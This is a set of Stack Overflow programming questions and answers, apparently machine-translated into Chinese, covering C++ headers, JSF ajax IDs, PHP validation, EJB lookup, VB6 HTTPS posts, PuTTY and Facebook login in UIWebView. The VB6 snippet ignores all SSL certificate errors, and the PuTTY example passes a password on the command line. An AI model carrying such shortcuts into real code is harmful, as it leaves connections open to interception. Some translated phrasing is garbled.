编辑：我按照 alexisdm 的注释编辑了代码。另外， in `rule.h`，我不得不将`ui`from的定义`Window * ui`改成`Ui::Window *ui`，因为 in `window.h`，`ui`被定义为`Ui::Window * ui`，这就是我要`Rule::rule`控制的对象。

但是现在，在rule.cpp中，`ui->do_stuff()`并没有编译，因为`Ui::Window`没有`do_stuff()`功能，但是`Window`...

精氨酸！该怎么办？！！ui->do_stuff() 在 window.cpp 中工作正常。继承问题？

窗口.cpp：

```
 Window::Window(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Window)
{
    ui->setupUi(this);

    player = new Game_state();                  /* Game state                   */
    rule = new Rule(player, ui);                /* Implement the action of cards*/
}
void Window::do_stuff(){
//Do stuff
} 
```

窗口.h

```
#include <QDialog>
#include "game_state.h"
#include "rule.h"

class Rule;
namespace Ui {
    class Window;
}

class Window : public QDialog
{
    Q_OBJECT

public:
    explicit Window(QWidget *parent = 0);
    ~Window();
    Game_state      * player;
    Rule            * rule;
    void do_stuff();

private:
    Ui::Window *ui;
}; 
```

规则.h

```
#ifndef RULE_H
#define RULE_H
#include "window.h"
#include <game_state.h>

class Window;

class Rule{
public:
    Rule(Game_state *, Ui::Window *);
    void action(Card *);

private:
    Game_state * player;
    Ui::Window     * ui;
};

#endif // RULE_H 
```

规则.cpp

```
 #include <rule.h>

    Rule::Rule(Game_state * game, Ui::Window * window){
        player = game;
        ui = window;
    }
    void Rule::stuff(){
        ui->do_stuff();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:38:55.943

您的标头中存在循环依赖关系：`window.h`并且`rule.h`相互引用。

您应该用`#include`前向声明替换两者以避免它。

```
class Window;  // instead of #include "window.h"
class Rule;  // instead of #include "rule.h" 
```

您仍然需要添加`#include "window.h"`in`rule.cpp`和`#include "rule.h"`in `window.cpp`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:24:27.770

我的猜测是您的班级名称，`Window`太通用了，`#include <window.h>`可能包括系统一而不是您的。

尝试将类和标题名称更改为更特定于您的应用的名称，例如`CardWindow`，或使用`#include "window.h"`

# jsf - 在 f:ajax 渲染中引用复合组件 ID

> ID：13313207
> 
> 赞同：3
> 
> 时间：2012-11-09T17:43:08.407
> 
> 标签：jsf, composite-component, clientid, ajax-update

我正在编写一个复合组件，该组件旨在包装一个输入元素，并在其下方添加一个“可选字段”名称和 h:message 元素。这是组件（在 input.xhtml 文件中）：

```
<composite:interface/>
<composite:implementation>
  <div>
  #{component.children[1].setStyleClass(component.children[1].valid ? '' : 'inputError')}
    <composite:insertChildren/>
  </div>
  <h:panelGroup styleClass="optional" 
      rendered="#{!component.parent.children[1].required}" 
      layout="block" >
    #{msgs['common.optional.field']}
  </h:panelGroup>
  <h:message id="msgId" 
       for="#{component.parent.children[1].id}" errorClass="error"/>
</composite:implementation> 
```

同样，该组件的预期用途是包装一个 h:input* 元素，该元素预计是它在使用页面中的第一个和直接子元素。

然后在使用页面中我会写：

```
 <h:form id="f1">
    <h:panelGrid border="0" columns="2" style="width: 80%">
        <f:facet name="header">
            <col width="40%" />
            <col width="60%" />
        </f:facet>
        <h:outputLabel styleClass="sectionBody" for="i1"
            value="Input 1"></h:outputLabel>
            <my:input id="ii1">
            <h:inputText id="i1" size="20" maxlength="20" tabindex="0"
            required="true" label="Input 1">
            </h:inputText>
            </my:input>
        <h:outputLabel styleClass="sectionBody" for="i2"
            value="Input 2"></h:outputLabel>
            <my:input id="ii2">
            <h:inputText id="i2" size="20" maxlength="20" tabindex="0"
                label="Input 2">
            </h:inputText>
            </my:input>
    </h:panelGrid>
    <br />
    <h:commandButton value="Submit" tabindex="1">
        <f:ajax listener="#{terminalImportBean.addTerminal}" 
          execute="@form" render="@form"/>
    </h:commandButton>
</h:form> 
```

使用普通帖子可以正常工作。但是，如果我为“Input 1”（id="i1"）添加 f:ajax 验证并尝试使用以下命令重新渲染复合（ii1）：

```
...   
         <h:outputLabel styleClass="sectionBody" for="i1"
            value="Input 1"></h:outputLabel>
         <my:input id="ii1">
            <h:inputText id="i1" size="20" maxlength="20" tabindex="0"
            required="true" label="Input 1">
               <f:ajax listener="#{myBean.checkInput1}" 
                  event="blur" 
                  render="ii1"/>
            </h:inputText>
         </my:input>
... 
```

我在 ajax 响应处理期间在浏览器中生成错误：

```
malformedXML: During update: f1:ii1 not found 
```

我尝试使用`f1:ii1`, `:f1:ii1`，但无济于事。当我使用`msgId`或`:f1:ii1:msgId`它有效时。有人知道为什么吗？

我正在使用 Mojarra 2.1.3

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T20:43:02.367

这是因为复合组件*本身*不会向 HTML 呈现任何内容。只有它的孩子被呈现为 HTML。`f1:i11`生成的 HTML 输出中不存在任何具有 ID 的 HTML 元素。在浏览器中打开页面，右键单击并*查看源代码*。自己进去看看。没有具有该 ID 的此类元素。JavaScript/Ajax 遇到了完全相同的问题。它找不到要更新的元素。

为了解决这个问题，您需要将整个复合体包装在 HTML 中`<div>`，或者`<span>`为其分配一个`#{cc.clientId}`基本上打印的 ID [`UIComponent#getClientId()`](http://docs.oracle.com/javaee/7/api/javax/faces/component/UIComponent.html#getClientId--)。

```
<cc:implementation>
    <div id="#{cc.clientId}">
        ...
    </div>
</cc:implementation> 
```

然后你可以参考如下：

```
<my:input id="foo" />
...
<f:ajax ... render="foo" /> 
```

您甚至可以引用特定的复合组件子组件。

```
<f:ajax ... render="foo:inputId" /> 
```

### 也可以看看：

*   [是否可以使用 JSF ajax 更新非 JSF 组件（纯 HTML）？](https://stackoverflow.com/questions/13009174/jsf-update-with-ajax-non-jsf-things)
*   [如何找出用于 ajax 更新/渲染的组件的客户端 ID？找不到从“bar”引用的表达式“foo”的组件](https://stackoverflow.com/questions/8634156/how-to-find-out-client-id-of-component-for-ajax-update-render-cannot-find-compo)

# php - 检查变量是否等于某个数字

> ID：13313209
> 
> 赞同：0
> 
> 时间：2012-11-09T17:43:14.437
> 
> 标签：php, validation, if-statement

我需要检查以确保变量等于 5、10、50 或 100。如果不是，那么我想将其设置为 5。有人可以告诉我这个 IF 语句有什么问题吗？

```
if (isset($_REQUEST['number']) && $_REQUEST['number'] !== "5" || $_REQUEST['number'] !== "10" || $_REQUEST['number'] !== "50" || $_REQUEST['number'] !== "100") {
  $number = 5;
} else {
  $number = $_REQUEST['number'];
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T17:44:50.877

您需要打破逻辑以克服[运算符优先级](http://php.net/manual/en/language.operators.precedence.php)。如有疑问，请使用括号。

我也颠倒了逻辑。读起来更自然。

```
if (isset($_REQUEST['number']) && ($_REQUEST['number'] == "5" || $_REQUEST['number'] == "10" || $_REQUEST['number'] == "50" || $_REQUEST['number'] == "100")) {
  $number = $_REQUEST['number'];
} else {
  $number = 5;
} 
```

虽然上述方法有效，但您也可以使用类似[`in_array()`](http://php.net/manual/en/function.in-array.php).

```
isset($_REQUEST['number']) && in_array($_REQUEST['number'], array(5, 10, 50, 100)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T17:45:04.323

尝试：

```
 if (isset($_REQUEST['number']) && ($_REQUEST['number'] == "5" || $_REQUEST['number'] == "10" || $_REQUEST['number'] == "50" || $_REQUEST['number'] == "100")) {
  $number = $_REQUEST['number']; 
 } else {
   $number = 5;
 } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T17:52:50.670

你有一些非常混乱的代码。你说你想要什么都不做。

应该是这样的：

```
if (isset($_REQUEST['number']) && in_array($_REQUEST['number'], array(5, 10, 50, 100))) {
    $number = (int) $_REQUEST['number'];
} else {
    $number = 5;
} 
```

结合其他答案，谢谢大家:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:06:14.897

尽管[iMoses](https://stackoverflow.com/a/13313364/165154)和其他人已经制定了简化日常工作的基础知识，但我建议让`in_array()`检查更加严格。如果您不这样做并且`$_REQUEST['number']`会，例如 equal `'10F'`，它也会通过。

```
// I like to define default values up front.
$number = 5;

// since $_REQUEST['number'] should always be a string
// make in_array() check strictly against these string values
$allowedNumbers = array( '5', '10', '50', '100' );

// make in_array check strictly
if( isset( $_REQUEST['number'] ) && in_array( $_REQUEST['number'], $allowedNumbers, true ) )
{
    // get proper integer value
    $number = intval( $_REQUEST['number'] );
}

var_dump( $number ); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-09T17:53:01.903

从长远来看，将逻辑分解为不同的格式以尝试更清晰可能会更容易，而不是使用单个“if”语句。

```
$acceptable = array(5, 10, 50, 100);
$number     = null;

if (isset($_REQUEST['number']) {
    $number = intval($_REQUEST['number']);
}

if (!in_array($number, $acceptable)) {
    $number = 5;
} 
```

但是将其保留为单个 if 语句：

```
if (
    isset($_REQUEST['number']) && (
        $_REQUEST['number'] === "5" ||
        $_REQUEST['number'] === "10" ||
        $_REQUEST['number'] === "50" ||
        $_REQUEST['number'] === "100"
    )
) {
  $number = $_REQUEST['number'];
} else {
  $number = 5;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-09T17:52:10.063

你需要交换一些东西：

```
if (!isset($_REQUEST['number']) || ($_REQUEST['number'] !== "5" && $_REQUEST['number'] !== "10" && $_REQUEST['number'] !== "50" && $_REQUEST['number'] !== "100")) {
  $number = 5;
} else {
  $number = $_REQUEST['number'];
} 
```

上面的叙述：如果没有设置number，则设置为5。如果设置了，但不是5、10、50或100，则设置为5。否则，保持原样。

# jakarta-ee - 按名称访问会话 bean，无需 JNDI-Lookup

> ID：13313210
> 
> 赞同：2
> 
> 时间：2012-11-09T17:43:23.247
> 
> 标签：jakarta-ee, glassfish, ejb, spring-el

我想为 Spring 表达式语言编写一个自定义[BeanResolver](http://static.springsource.org/spring/docs/3.1.2.RELEASE/javadoc-api/org/springframework/expression/BeanResolver.html)来解析表达式中的 EJB（例如`"@MyBean.property=='example-value'"`）。如何在不执行 JNDI-Lookup 的情况下按名称检索 bean？我是否必须为我选择的应用程序服务器编写一个插件（这将是 glassfish）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-10T16:09:16.353

EE 注入和 JNDI 查找是所有 EJB 的入口点；没有其他标准方法可以获取 EJB 的实例。如果您使用的是 EJB 3.1，则 、 和 中的绑定`java:global`定义`java:app`良好`java:module`，开发人员无法更改。

```
java:global/MyApp/MyModule/MyBean!com.example.MyIntf
java:app/MyModule/MyBean!com.example.MyIntf
java:module/MyBean!com.example.MyIntf 
```

这实际上是按名称定位 EJB。（它确实需要 JNDI，但是从您的描述中并不清楚为什么 JNDI 本身会有问题，尽管我确实理解为什么绑定是一个问题。）如果您知道 EJB 只支持一个接口，您可以省略`!com.example.MyIntf`.

# javascript - 每次回发发生时都需要从 .aspx (VB.net) 页面调用 Javascript 函数

> ID：13313213
> 
> 赞同：2
> 
> 时间：2012-11-09T17:43:28.173
> 
> 标签：javascript, asp.net, vb.net

我有一个大的 .aspx 页面，其中包含多个服务器控件。而且，这个 .aspx 页面还引用了一个 JavaScript 文件。我想在这个现有的 .js 文件中有一个 JavaScript 函数，它将在服务器发生任何回发之前被调用。

[注意：我看到另一篇文章提到如何在 JQuery 中执行此操作（[如何在 ASP.NET 应用程序中使用 jQuery 捕获提交事件？](https://stackoverflow.com/questions/1230573/how-to-capture-submit-event-using-jquery-in-an-asp-net-application)），但我希望通过现有的 JavaScript 文件完成，而不是使用像JQuery这样的新技术]

[已编辑]~~使用 OnSubmit 处理程序的解决方案对我不起作用......因为它不会被服务器控件触发的回发调用。~~

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T17:53:41.887

你需要这样的东西：

```
/* 
   usually there is only one form in asp.net, but if you know you can have 
   more than one, you can get main form with document.getElementById
*/
var form = document.getElementsByTagName("form")[0];     
if (form.addEventListener) {
    form.addEventListener('submit', functionThatShouldBeCalledBeforeSubmit, false); 
} else if (form.attachEvent)  {
    form.attachEvent('onsubmit', functionThatShouldBeCalledBeforeSubmit);
} 
```

`onsubmit`任何时候提交表单，事件都会触发。不管怎样。

有关使用 JS 附加事件的更多详细信息：[https ://developer.mozilla.org/en-US/docs/DOM/element.addEventListener](https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener)

# c++ - 我的第一个 C++ 外观

> ID：13313215
> 
> 赞同：-3
> 
> 时间：2012-11-09T17:43:36.617
> 
> 标签：c++

我是 ac# 程序员，但今天我正在考虑迁移到 c++，我想知道的第一件事是有 2 种类型的项目 CLR 控制台应用程序和 Win32 控制台应用程序

另外让我感到困惑的是，在 Win32 中，我可以使用 printf 或 cout 将行写入控制台

而在 CLR 中，我也可以使用熟悉的 Console::WriteLine

我很困惑拥有所有功能只是为了写一行有什么意义，CLR和Win32应用程序之间有什么区别

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T17:51:30.690

*   `printf`是C方式。它不是类型安全的，但速度很快。它在标准 C 库上运行。（C++ 可以做到这一点，但这不正常。）
*   `cout`是C++方式。它是类型安全的，并且是 C++ 中的常规方式。它在标准 C++ 库上运行。
*   `WriteLine`是 .Net 方式，因此是 C++/CLI 方式。它在 .Net 库上运行。
*   `WriteConsole`是Windows的方式。这是一个原始的操作系统调用，所以速度很快，但很难使用且不可移植。不要使用这个。

至于比较*语言*，C 是一种不太复杂的语言（使*您的*代码更复杂），但 C++ 有模板，因此它们的速度大致相同，具体取决于任务。它们是普通的 Win32 应用程序，这意味着它们已预先编译为原始机器代码，并由处理器直接运行。C++/CLI 运行在 .Net 框架之上，这意味着它在由 .Net 框架运行时进行编译，并且它的运行速度往往比 C 或 C++ 慢。

对这一切持保留态度。 `WriteConsole`能做别人不能轻易做的事。.Net 框架在某些方面速度*惊人。*但一般来说，使用与您的语言相关的版本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T17:49:55.247

CLR，公共语言运行时，用于构建 .net 应用程序。如果您不需要 .net 库，只需使用 Win32 控制台。

Cout 是 C++ 命令，其中 printf 是 C 命令。C++ 仍然支持很多 C 命令。大多数时候我使用 C++ 变体，但由于它们完成工作的方式存在差异，您可能希望在某些情况下使用旧的 C 命令。

另一个注意事项：对于从 C# 迁移到 C++ 的人来说，只是一个有用的建议：您需要自己管理内存。您创建的新对象需要被删除，没有像 C# 中那样的内置内存管理器。

# vb6 - XML-RPC HTTPS POST 使用 MSXML2.ServerXMLHTTP.6.0 VB 6

> ID：13313216
> 
> 赞同：3
> 
> 时间：2012-11-09T17:43:42.437
> 
> 标签：vb6, https, xml-rpc, serverxmlhttp

在 VB6 中使用 MSXML2.ServerXMLHTTP.6.0 的 RPC

我正在与之通信的服务器正在使用 SSL 槽端口 40052 和自签名 CA，在发布之前我已经尝试让它工作大约 2 天，希望有人能提供帮助。

我的问题是当我调用方法 Send

如果没有忽略 ssl 错误，则表示证书颁发机构无效

如果忽略 ssl 错误，则表示服务器返回了无效或无法识别的响应

```
Dim strXml As String
Dim xmlLength As Integer

strXml = "<?xml version=""1.0""?><methodCall> " & _
                 "<methodName>somemethod</methodName> " & _
                 "<params> " & _
                 "<param><value><string>en</string></value></param>" & _
                 "<param><value><string>something</string></value></param>" & _
                 "<param><value><string>00000</string></value></param>" & _
                 "<param><value><string>000000000000000000000</string></value></param>" & _
                 "</params>" & _
                 "</methodCall>"
xmlLength = Len(strXml)

' object to communicate with
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

'since the server i am communicating with is using a self signed certificate authority
' I have to ignore all ssl errors.
xmlHttp.setOption 2, 13056 

' I set the friendlyname of my certificate just in case i have tried with and without
xmlHttp.setOption 3, "myrealfriendlynameofcrt"

' I open the connection with the server.
' the server is NOT USING 443 for ssl it's using 50042
xmlHttp.Open "POST", "https://hostname.com:50042", False

' I specify my content type
xmlHttp.SetRequestHeader "Content-Type", "text/xml"

' I specify my content length (I did try with this line and without)
xmlHttp.SetRequestHeader "Content-Length", xmlLength

' I send my request ( MY ERROR OCCURS HERE )
' IF SSL ERRORS NOT IGNORE IT SAYS INVALID CERTIFICATE AUTHORITY
' IF SSL ERRORS IGNORED IT SAYS THE SERVER RETURNED AN INVALID OR UNRECOGNIZED RESPONSE
xmlHttp.send strXml

If xmlHttp.Status >= 400 And xmlHttp.Status <= 599 Then
    Debug.Print "Error occured : " & xmlHttp.Status & " - " & xmlHttp.StatusText
Else
    Debug.Print xmlHttp.ResponseText
End If

Set xmlHttp = Nothing 
```

# ssh - 腻子会话从端口上的快捷方式开始

> ID：13313218
> 
> 赞同：4
> 
> 时间：2012-11-09T17:43:54.213
> 
> 标签：ssh, putty

所以我使用快捷方式从默认端口上的用户/密码加载会话，如下所示：

.\putty.exe 根@212.83。***.*** -pw 密码

我已将服务器上的 SSH 端口从 22 更改为其他端口。我怎样才能使该快捷方式也加载到端口上？例如：-port 09？

另外，在批处理文件中，我可以让它像上面那样加载一个腻子会话并发送一个命令吗？

谢谢！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-09T18:22:01.777

在保存的会话中创建一个腻子配置文件，然后从命令行调用它，例如：

```
putty.exe -load my_putty_profile 
```

可以将 ssh 远程命令放在配置文件中（在 Connection | SSH 下）。

在配置文件中指定端口，或者使用`-P port`命令行参数。

# java - 内部类问题，toString 冲突

> ID：13313222
> 
> 赞同：0
> 
> 时间：2012-11-09T17:44:06.603
> 
> 标签：java, tostring, inner-classes

基于 Head First 书籍示例之一，我遇到了一些麻烦，其中 toString 方法导致我的学生出现问题，并且它们是正确输出的 uni 和家庭地址。我要做的就是输出如果学生的大学地址为空，则使用他的家庭地址，否则使用大学地址。

但我的测试数据如下所示

> 约翰·约翰诺丁汉大道 72 号
> 
> 约翰诺丁汉大道 72 号

```
public class Test {
public static void main(String[] args){
    Student student1 = new Student("John", 19, "Walkers Way");
    student1.setUniAddress(72, "Nottingham Drive");
    System.out.print(student1.toString());
    }
} 
```

其他类

```
public class Student {
private String name;
private Address homeAddress, uniAddress;

public Student(String name, int houseNumber, String homeStreet){
    this.name = name;
    this.homeAddress = new Address(houseNumber, homeStreet);
}

public String getName() { return this.name; }
public Address getHomeAddress(){
    if(this.uniAddress == null){
        return this.homeAddress;
    }else{
        return getUniAddress();//this.uniAddress;
    }
}

public Address getUniAddress() { return this.uniAddress; }
public void setUniAddress(int number, String add){
    Address address = new Address(number, add);
    uniAddress = address;
}

@Override
public String toString(){
    return getName() + " " + getHomeAddress() + " " + getUniAddress() + "\n";
}

public class Address{
    private int number;
    private String street;
    public Address(int no, String street){
        this.number = no;
        this.street = street;
    }

    @Override
    public String toString(){
        return name + number + " " + street + "\n";
    }
} 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T17:47:50.883

您的`getHomeAddress`方法负责显示 uni 地址，因此这一行：

```
return getName() + " " + getHomeAddress() + " " + getUniAddress() + "\n"; 
```

可以缩短为：

```
return getName() + " " + getHomeAddress() + " " + "\n"; 
```

否则你的`getHomeAddress`方法会拉取uni地址，那么你的`getUniAddress`方法会再次拉取uni地址。

同样在您的地址中`toString`，您正在提取此人的姓名，而您可能不是故意的（而且您可能也不想在此处使用换行符，因为您在其他`toString`方法中有换行符）。

```
@Override
public String toString(){
    return number + " " + street;
} 
```

# facebook - 如何让 UIWebView 打开 Facebook 登录页面以响应 iOS 5 和 iOS 6 上的 OAuth 请求？

> ID：13313225
> 
> 赞同：6
> 
> 时间：2012-11-09T17:44:17.697
> 
> 标签：facebook, ios5, oauth, ios6, facebook-login

我们有：
(1) 具有 Facebook OAuth 功能的基于 Facebook API 的网络应用程序（“FB 网络应用程序”）
（2）`UIWebView`基于 iPad 的浏览器（“浏览器”）

我们的目标是在 iPad 上的基于 UIWebView 的浏览器 (2) 中打开 Facebook 登录页面以登录到 FB Web 应用程序 (1)。

这里有一个类似的问题：http:
[//facebook.stackoverflow.com/questions/11337285/no-longer-able-to-login-to-ios-app-via-oauth-the-page-requested-was-未找到](http://facebook.stackoverflow.com/questions/11337285/no-longer-able-to-login-to-ios-app-via-oauth-the-page-requested-was-not-found)

但是，该问题的问题发生在用户在 Facebook 表单中输入登录名和密码之后。我们的问题是我们无法首先显示 Facebook 登录表单。如该问题中所建议的，将应用程序类型从“Web”更改为“Native/Desktop”并没有帮助。

步骤： 1\. 使用此浏览器
打开我们的网页（简单的 HTML 页面） 2\. 点击此页面上的“FB web app”启动按钮 3\. OnClick JavaScript 尝试启动 OAuth，这应该会打开 Facebook 的登录屏幕进行登录到 FB 网络应用程序 `UIWebView`

当前结果（问题）：
在 iOS 5.+ 和 iOS 6.+ 设备上
- 我们的网页保持不变
- Facebook 登录页面未显示（我们的网页仍然显示）
在 iOS 4.3 上（按预期工作）：
- Facebook登录页面在浏览器的同一`UIWebView`对象中打开（替换我们的网页）

预期结果：
- 显示 Facebook 登录页面，用户可以输入 Facebook 登录名和密码
- 如果在 iPad 上的 Safari 浏览器中启动，则适用于 iOS 5.+ 和 iOS 6.+。Facebook 登录页面在单独的选项卡中打开（相比之下，没有单独的选项卡`UIWebView`）

问：如何`UIWebView`在 iOS 5+ 和 iOS 6+ 上打开 Facebook 登录页面以响应 OAuth 请求？

更多技术细节：

我们从内部记录不同的`NSURLRequest`字段

```
-(BOOL)webView(UIWebView*)webView shouldStartLoadWithRequest(NSURLREquest*)request navigationType:… 
```

我们注意到日志中“正确”和“不正确”行为的一些差异。执行流程对我来说是这样的：

首先，我按“FB Web App”启动按钮启动 OAuth，然后有些情况下

iOS 4.3，“正确”<br> 请求 www.facebook.com/dialog/oauth?...
请求 fbwebapp.com
请求 m.facebook.com/login.php?....
--here facebook login出现

iOS 5.0，“不正确1”<br> 对 www.facebook.com/dialog/oauth 的请求？...
对 fbwebapp.com
的请求 对 m.facebook.com/login.php 的请求？...

那么它可能是
——很多 m.facebook.com/login.php?...with next... in parameters
随后是 sqlite 错误——
现在我看到来自 facebook 的“抱歉，出了点问题”页面（这是一个我第一次遇到它）

iOS 6.0 “不正确2”<br> 对 www.facebook.com/dialog/oauth 的
请求？...对 fbwebapp.com 的请求

> -(void)webView:(UIWebView*)webView didFailLoadWithError:(NSError*)error 被调用，错误代码为 -999

您可以看到该行为肯定取决于 iOS 版本。但常见的情况是在获取 m.facebook.com/login.php.. URL 的步骤中发生错误。但这就是我们能检测到的全部。

我们整天都在撞墙寻找解决方案。无可救药。
您能帮我们打开 Facebook 登录页面`UIWebView`以响应 OAuth 吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-05-21T11:10:10.897

只需使用：此代码

```
if (![FBSDKAccessToken currentAccessToken]) 
{   
    FBSDKLoginManager *manager = [[FBSDKLoginManager alloc]init];
    manager.loginBehavior = FBSDKLoginBehaviorWeb;
    [manager logInWithReadPermissions:@[@"public_profile", @"email", @"user_friends"] handler:
     ^(FBSDKLoginManagerLoginResult *result, NSError *error) {

         NSLog(@"result.token: %@",result.token.tokenString);  
         NSLog(@"%@",result.token.userID);   
         NSLog(@"%hhd",result.isCancelled);     
     }];
} 
```

// 这里`manager.loginBehavior = FBSDKLoginBehaviorWeb;`是你打开 facebook 所需要的一切`UIWebview`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-21T00:12:45.513

做到了！

这有点像 hack，但是 iOS 6 上 UiWebView 上的 js facebook sdk 登录终于可以工作了。

怎么可能做到？它是一个纯 JS + Facebook JS SDK + UIWebView Delegate 处理功能的解决方案。

JS - 第一步）

登录按钮（用于连接 facebook）调用此函数示例，这将触发 Face JS 登录/oauth 对话框：

```
function loginWithFacebookClick(){

FB.login(function(response){
    //normal browsers callback 
});

} 
```

JS - 第二步）

每次用户加载网页时（在 FB.init() 之后）添加一个 authResponseChange 监听器以捕获用户的连接状态：

```
FB.Event.subscribe('auth.authResponse.Change', function(response){
//UIWebView login 'callback' handler
var auth = response.authResponse;
if(auth.status == 'connected'){
    //user is connected with facebook! just log him at your webapp
}
}); 
```

并且使用应用程序的 UIWebView 委托函数，您可以处理 facebook oauth 响应

目标 C - 第三步）

```
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
{
NSString *url = [[request URL] absoluteString];

//when user status == connected (has a access_token at facebook oauth response)
if([url hasPrefix:@"https://m.facebook.com/dialog/oauth"] && [url rangeOfString:@"access_token="].location != NSNotFound)
{
    [self backToLastPage];
    return NO;
}

return YES;
}

- (void)webViewDidFinishLoad:(UIWebView *)webView
{

NSString *url = [[webView.request URL] absoluteString];

if([url hasPrefix:@"https://m.facebook.com/dialog/oauth"])
{
    NSString *bodyHTML = [webView stringByEvaluatingJavaScriptFromString:@"document.body.innerHTML"];

    //Facebook oauth response dead end: is a blank body and a head with a script that does 
    //nothing. But if you got back to your last page, the handler of authResponseChange
    //will catch a connected status if user did his login and auth app
    if([bodyHTML isEqualToString:@""])
    {
        [self backToLastPage];
    }
}

} 
```

因此，当“重定向”用户到最后加载的页面时，第二步是在 facebook 登录对话框中处理用户操作。

如果我对这个答案太快了，请问我！希望能帮助到你。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-01-13T21:47:40.310

如果有人在谷歌搜索，这对我有用：

```
-(BOOL) webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)inType {
    if ([request.URL.absoluteString containsString:@"m.facebook.com"]) {
        if ([request.URL.absoluteString rangeOfString:@"back"].location == 0) {
            [self.popUp removeFromSuperview];
            self.popUp = nil;
            return NO;
        }
        if (self.popUp) {
            return YES;
        }

        UIWebView *wv = [self popUpWebView];
        [wv loadRequest:request];
        return NO;
    }
    return YES;
}

- (UIWebView *) popUpWebView {
    toolbar height
    UIWebView *webView = [[UIWebView alloc]
            initWithFrame:CGRectMake(0, 0, (float)self.view.bounds.size.width,
                    (float)self.view.bounds.size.height)];
    webView.scalesPageToFit = YES;
    webView.delegate = self;
    // Add to windows array and make active window
    self.popUp = webView;
    [self.view addSubview:webView];
    return webView;
}

- (void)webViewDidFinishLoad:(UIWebView *)webView {

    if (self.popUp) {
        NSError *error = nil;
        NSString *jsFromFile = @"window.close=function(){window.location.assign('back://' + window.location);};";
        __unused NSString *jsOverrides = [webView
                stringByEvaluatingJavaScriptFromString:jsFromFile];

        JSContext *openerContext = [self.webView
                valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"];
        JSContext *popupContext = [webView
                valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"];
        popupContext[@"window"][@"opener"] = openerContext[@"window"];
    }

  //this is the secret sauce  
  if (webView == self.popUp
            && [webView.request.URL.absoluteString containsString:@"m.facebook.com"]
            && [[webView stringByEvaluatingJavaScriptFromString:@"document.body.innerHTML"] isEqualToString:@""]) {
        [webView stringByEvaluatingJavaScriptFromString:@"eval(document.getElementsByTagName('script')[0].text)"];
    }
} 
```

[我从这里抓到了一堆这个实现](http://brainwashinc.com/2014/01/06/ios-uiwebview-handle-window-openwindow-close-popup-page/)。

根据您的 Web 实施，可能会有一个额外的步骤。Facebook 脚本实际上执行 a `window.close()`then a `window.open()`then a `window.close()`。对我来说，这引起了问题，因为在 Web 端，在此登录完成后，我的窗口（即我希望用户登录的 webView）收到`window.close()`来自 Facebook SDK 的呼叫。我假设这是因为 Facebook SDK 期望该`window.open()`调用打开一个将关闭的新窗口。

由于我们没有覆盖 的功能`window.open()`，调用`window.open()`不会做任何事情，Facebook SDK 将尝试关闭您的窗口。这可能会导致各种问题，但对我来说，因为我使用的是 Parse，`window.localStorage`所以`null`我遇到了各种错误。

如果您遇到类似的情况，您有两种选择来解决它：

1.  如果您可以控制 Web 代码，并且想进行一些小技巧，请把它扔进去`window.close=function(){}`
2.  如果您无法控制 Web 代码，您可以`window.close`像我们为 popUp webView 所做的那样为主 webView 添加覆盖，或者覆盖`window.open`打开另一个弹出窗口的功能（在[此处更详细地描述](http://brainwashinc.com/2014/01/06/ios-uiwebview-handle-window-openwindow-close-popup-page/)）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-11T16:59:36.070

使用 FBDialog 类来提示用户登录。这在应用程序内部使用 webview，因此在成功登录后，用户将在任何 UIWebView 内部登录：

```
NSString *kRedirectURL  = @"fbconnect://success";
NSString *kSDK = @"ios" ;
NSString *kLogin = @"oauth";
NSString *kDialogBaseURL = @"https://m.facebook.com/dialog/";

NSMutableDictionary* params = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                               AE_FACEBOOK_APPID, @"client_id",
                               @"user_agent", @"type",
                               kRedirectURL, @"redirect_uri",
                               @"touch", @"display",
                               kSDK, @"sdk",
                               nil];

NSString *loginDialogURL = [kDialogBaseURL stringByAppendingString:kLogin];

FBLoginDialog* loginDialog = [[FBLoginDialog alloc] initWithURL:loginDialogURL
                                                    loginParams:params
                                                       delegate:self];
[loginDialog show]; 
```

然后让你的类遵守 FBDialogDelegate 协议，并将这个函数添加到你的类中：

```
-(void)fbDialogLogin: (NSString *)token expirationDate:(NSDate *)expirationDate{
    // Store the token and expiration date into the FB SDK
    self.facebook.accessToken = token;
    self.facebook.expirationDate = expirationDate;
    // Then persist these so the SDK picks them up on next load

    NSUserDefaults* defaults = [NSUserDefaults standardUserDefaults];

[defaults setObject:self.facebook.accessToken forKey:ACCESS_TOKEN_KEY];
[defaults setObject:self.facebook.expirationDate forKey:EXPIRATION_DATE_KEY];
[defaults synchronize];
} 
```

！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-02-08T08:37:34.873

如何在 UIWebView 中登录 Facebook。

**目标-c**

使用[泰勒斯汀的答案](https://stackoverflow.com/a/34777695/7532833)。他拯救了我的一天。[谢谢泰勒斯汀](https://stackoverflow.com/a/34777695/7532833)_

